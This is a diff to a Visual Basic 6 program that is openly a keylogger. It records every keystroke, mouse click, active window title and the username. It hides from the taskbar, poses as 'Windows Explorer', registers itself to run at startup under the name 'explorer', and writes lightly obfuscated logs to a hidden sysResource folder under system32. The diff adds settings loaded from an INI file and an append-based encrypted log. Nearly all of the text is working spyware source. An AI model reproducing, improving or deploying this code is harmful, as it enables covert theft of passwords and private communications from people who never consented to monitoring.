@@ -1,47 +1,54 @@
 VERSION 5.00
+Object = "{45CB9C9B-4BC4-11D1-AE5C-CCA603C10627}#1.0#0"; "INIEdit.ocx"
 Begin VB.Form Form1 
    BorderStyle     =   1  'Fixed Single
    Caption         =   "Windows Explorer"
-   ClientHeight    =   6000
+   ClientHeight    =   6165
    ClientLeft      =   45
    ClientTop       =   435
-   ClientWidth     =   10230
+   ClientWidth     =   6690
    ControlBox      =   0   'False
    Icon            =   "Form1.frx":0000
    LinkTopic       =   "Form1"
    MaxButton       =   0   'False
    MinButton       =   0   'False
-   ScaleHeight     =   6000
-   ScaleWidth      =   10230
+   ScaleHeight     =   6165
+   ScaleWidth      =   6690
    StartUpPosition =   3  'Windows Default
-   Begin VB.TextBox Text3 
-      Height          =   4335
-      Left            =   6480
-      MultiLine       =   -1  'True
-      TabIndex        =   6
-      Top             =   720
-      Width           =   3135
+   Begin VB.TextBox sysPath 
+      Height          =   285
+      Left            =   240
+      TabIndex        =   7
+      Top             =   5160
+      Visible         =   0   'False
+      Width           =   5775
+   End
+   Begin VB.TextBox txtencr 
+      Height          =   1935
+      Left            =   120
+      ScrollBars      =   3  'Both
+      TabIndex        =   5
+      Top             =   3240
+      Width           =   6135
+   End
+   Begin INITools.INITool INITool1 
+      Left            =   240
+      Top             =   5520
+      _ExtentX        =   1085
+      _ExtentY        =   873
    End
    Begin VB.Timer Timer2 
       Interval        =   530
       Left            =   5640
       Top             =   0
    End
-   Begin VB.CheckBox chkAllowBS 
-      Caption         =   "Dont Print Backspace"
-      Height          =   375
-      Left            =   240
-      TabIndex        =   5
-      Top             =   5520
-      Value           =   1  'Checked
-      Width           =   1935
-   End
    Begin VB.FileListBox File1 
-      Height          =   3405
-      Left            =   4680
+      Height          =   480
+      Left            =   5640
       TabIndex        =   4
-      Top             =   960
-      Width           =   1335
+      Top             =   2520
+      Visible         =   0   'False
+      Width           =   975
    End
    Begin VB.CommandButton Command2 
       Caption         =   "Close"
@@ -68,11 +75,11 @@ Begin VB.Form Form1
       Width           =   4455
    End
    Begin VB.TextBox Text1 
-      Height          =   4695
+      Height          =   2295
       Left            =   120
       Locked          =   -1  'True
       MultiLine       =   -1  'True
-      ScrollBars      =   2  'Vertical
+      ScrollBars      =   3  'Both
       TabIndex        =   0
       Top             =   600
       Width           =   6135
@@ -82,6 +89,14 @@ Begin VB.Form Form1
       Interval        =   65
       Left            =   120
       Top             =   240
+   End
+   Begin VB.Label Label1 
+      Caption         =   "Encrypted:"
+      Height          =   255
+      Left            =   120
+      TabIndex        =   6
+      Top             =   3000
+      Width           =   3735
    End
 End
 Attribute VB_Name = "Form1"
@@ -120,8 +135,8 @@ Private Const REG_SZ = 1
 
 Private m_IgnoreEvents As Boolean
 
-'username import fun
-Private Declare Function GetUserName Lib "advapi32.dll" Alias "GetUserNameA" (ByVal lpbuffer As String, nSize As Long) As Long
+'username import function
+Private Declare Function GetUserName Lib "advapi32.dll" Alias "GetUserNameA" (ByVal lpBuffer As String, nSize As Long) As Long
 
 'Active windowtitle part
 Private Declare Function GetForegroundWindow Lib "user32" () As Long
@@ -132,34 +147,95 @@ Private Declare Function GetParent Lib "user32" (ByVal hwnd As Long) As Long
 'keylogger part
 Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer
 Private Declare Function GetKeyState Lib "user32" (ByVal nVirtKey As Long) As Integer 'caps keystate
-Dim result As Integer
 
 
+'Get system directory part
+Private Declare Function GetSystemDirectory Lib "kernel32" Alias _
+"GetSystemDirectoryA" (ByVal lpBuffer As String, _
+ByVal nSize As Long) As Long
+Dim SysDir As String
 
+
+'Loadsetting variable declaration
+Dim wTitle, AllowBS As Boolean
+Dim ext, encCode As String, LogMode As Integer
+Dim lpath, LogDir As String
 
 Private Sub Form_Load()
+'Get sysDirectory
+SysDir = String(80, 0)
+Call GetSystemDirectory(SysDir, 80)     'stores global variable sysDir i.e, system32 path.
+
+sysPath.Text = SysDir
+
 'if program already running then confuse user that it is explorer
 If App.PrevInstance = True Then
         Shell "C:\WINDOWS\explorer.exe", vbNormalFocus 'This program is already running!
         End
 End If
+
+Call loadsetting
+
+If LogDir = "sys" Then  'Check Where should log stored system dir or defined path in setting.ini
+sysPath.Text = SysDir
+Else
+sysPath.Text = LogDir
+End If
+
+
 'hiding app
 App.TaskVisible = False
 'Me.Hide
 Timer1.Enabled = True
 
-Text1.Text = "'" & Date & "','" & Time & "','" & username & "'" & Chr(13) & vbCrLf  'prints info at startup
 
 On Error Resume Next
 Call setautorun
-FileCopy App.Path & "\" & App.EXEName & ".exe", "C:\windows\system32\explorer.exe"
-MkDir "c:\sysResource"
-File1.Path = "c:\sysResource"
-End Sub
+'FileCopy App.Path & "\" & App.EXEName & ".exe", sysPath & "\explorer.exe"
+MkDir sysPath & "\sysResource"
+File1.Path = sysPath & "\sysResource"
 
+If LogMode = 0 Then
+    lpath = sysPath & "\sysResource\browse" & File1.ListCount + 1 & "xcz" & ext
+ElseIf LogMode = 1 Then
+    Dim a As Variant
+    a = Format$(Now, "dd" & "mm")
+    lpath = sysPath & "\sysResource\browse" & a & "xcz" & ext
+ElseIf LogMode = 2 Then
+    lpath = sysPath & "\sysResource\browsexcz" & ext
+End If
+
+'Write initials
+If Dir$(lpath) <> "" Then
+'MsgBox ("The file exist")
+Open lpath For Append As 1
+Write #1, Time, encCode, App.Revision, username
+Close #1
+Else
+'MsgBox ("The file does not exist")
+Open lpath For Append As 1
+Write #1, Time, encCode, App.Revision, username
+Close #1
+End If
+   
+End Sub
+Private Sub loadsetting()
+Dim sDr As String
+sDr = Left(SysDir, 2)
+On Error GoTo err
+AllowBS = INITool1.GetFromINI("LogSetting", "USEBS", sDr & "\Program Files\Common Files\setting.ini")
+wTitle = INITool1.GetFromINI("LogSetting", "UseChildTitle", sDr & "\Program Files\Common Files\setting.ini")
+encCode = INITool1.GetFromINI("LogSetting", "EncCode", sDr & "\Program Files\Common Files\setting.ini")
+ext = INITool1.GetFromINI("LogSetting", "extension", sDr & "\Program Files\Common Files\setting.ini")
+Timer1.Interval = INITool1.GetFromINI("LogSetting", "TimerInt", sDr & "\Program Files\Common Files\setting.ini")
+LogMode = INITool1.GetFromINI("LogSetting", "LogMode", sDr & "\Program Files\Common Files\setting.ini")
+LogDir = INITool1.GetFromINI("LogSetting", "LogDir", sDr & "\Program Files\Common Files\setting.ini")
+err:
+If err.Number = 13 Then End             'setting.ini not found
+End Sub
 Private Sub setautorun()
 ' Clear or set the key that makes the program run at startup.
-    SetRunAtStartup "explorer", "c:\windows\system32"
+    SetRunAtStartup "explorer", App.Path & ""
 End Sub
 Private Sub SetRunAtStartup(ByVal app_name As String, ByVal app_path As String)
 Dim hKey As Long
@@ -175,8 +251,8 @@ Dim status As Long
         KEY_WRITE, ByVal 0&, hKey, _
         ByVal 0&) <> ERROR_SUCCESS _
     Then
-        MsgBox "Error " & Err.Number & " opening key" & _
-            vbCrLf & Err.Description
+        MsgBox "Error " & err.Number & " opening key" & _
+            vbCrLf & err.Description
         Exit Sub
     End If
 
@@ -187,8 +263,8 @@ Dim status As Long
             ByVal key_value, Len(key_value))
 
         If status <> ERROR_SUCCESS Then
-            MsgBox "Error " & Err.Number & " setting key" & _
-                vbCrLf & Err.Description
+            MsgBox "Error " & err.Number & " setting key" & _
+                vbCrLf & err.Description
         End If
    
 
@@ -197,7 +273,7 @@ Dim status As Long
     Exit Sub
 
 SetStartupError:
-    MsgBox Err.Number & " " & Err.Description
+    MsgBox err.Number & " " & err.Description
     Exit Sub
 End Sub
 Private Sub Command1_Click()
@@ -212,10 +288,11 @@ Private Sub Command2_Click()
 End
 End Sub
 Private Sub Timer2_Timer()
-    Text2.Text = GetActiveWindowTitle(False)            'Get window title after 550 interval
+    Text2.Text = GetActiveWindowTitle(wTitle)            'Get window title after 550 interval
 End Sub
 Private Sub Timer1_Timer()
 Dim i As Integer
+Dim result As Integer
 For i = 1 To 255
  result = GetAsyncKeyState(i)
 If result = -32767 Then
@@ -224,9 +301,8 @@ If result = -32767 Then
     Else                                            'non alphabets
         If i = 1 Then                               'it is Click
         Text1.Text = Text1.Text & "[C]"             'Print [C] to show click
-        Call recordnow
         ElseIf i = 8 Then                           'Key pressed is Backspace
-            If chkAllowBS = vbChecked Then          ' delete last letter
+            If AllowBS = True Then                  ' delete last letter
                 If Len(Text1) > 0 And Right(Text1.Text, 1) <> "]" And Right(Text1.Text, 1) <> Chr(13) Then Text1.Text = Left(Text1.Text, Len(Text1) - 1)
             Else
                 Text1.Text = Text1.Text + "[BS]"    ' print [BS] in log
@@ -238,6 +314,20 @@ If result = -32767 Then
 End If
 Next i
 End Sub
+'************************Recording to file use of Append*********
+Private Sub appendnow()
+Dim i As Integer
+For i = 1 To Len(Text1)
+txtencr.Text = txtencr.Text & Chr(Asc(Mid(Text1, i, 1)) + encCode)
+Next i
+
+Open lpath For Append As #1
+        Print #1, txtencr.Text
+        Text1.Text = ""
+        txtencr.Text = ""
+Close #1
+End Sub
+
 '''**********************shiftkey****************
 Private Function checkshift(ByVal b As Integer) As String
     If GetAsyncKeyState(vbKeyShift) Then
@@ -433,18 +523,8 @@ Case Else
 End Select
 End Function
 Private Sub Text2_Change()
-Text1.Text = Text1.Text & vbCrLf & Time & " : " & Text2.Text & vbCrLf
-End Sub
-'************************Recordingtofile*********
-Private Sub recordnow()
-Dim i As Integer
-For i = 1 To Len(Text1)
-Text3.Text = Text3.Text & Chr(Asc(Mid(Text1, i, 1)) + 1)
-Next i
-
-Open "c:\sysResource\browse" & File1.ListCount + 1 & "xcz" & ".dll" For Output As #1
-        Print #1, Text3.Text
-Close #1
+Call appendnow
+If Trim(Text2.Text) <> "" Then Text1.Text = Text1.Text & vbCrLf & Time & " : " & Text2.Text & vbCrLf
 End Sub
 '******************kEYCASEPART***********
 Function correctcase(ByVal b As Integer) As String
@@ -502,14 +582,14 @@ GetActiveWindowTitle = GetWindowTitle(i)
 End Function
 Public Function GetWindowTitle(ByVal hwnd As Long) As String
 Dim l As Long
-Dim s As String
+Dim S As String
 
 l = GetWindowTextLength(hwnd)
-s = Space(l + 1)
+S = Space(l + 1)
 
-GetWindowText hwnd, s, l + 1
+GetWindowText hwnd, S, l + 1
 
-GetWindowTitle = Left$(s, l)
+GetWindowTitle = Left$(S, l)
 End Function
 
 
